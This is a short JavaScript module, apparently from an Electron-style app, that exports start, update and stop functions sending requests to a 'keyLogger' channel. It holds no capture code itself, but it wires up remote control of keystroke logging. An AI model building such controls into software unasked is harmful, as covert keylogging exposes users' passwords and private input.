/*
 * @Auther: MercyLin
 * @Description: description
 * @Date: 2020-09-07 17:22:39
 * @LastEditors: MercyLin
 * @LastEditTime: 2020-09-10 22:11:39
 * @FilePath: \my-project\src\main\Connect\request\keylogger.js
 */

import { sendRequest } from '../index'

export default{
  startKeyLogger: () => sendRequest('keyLogger', { method: 'start' }),
  updateKeyLogger: () => sendRequest('keyLogger', { method: 'update' }),
  stopKeyLogger: () => sendRequest('keyLogger', { method: 'stop' })
}
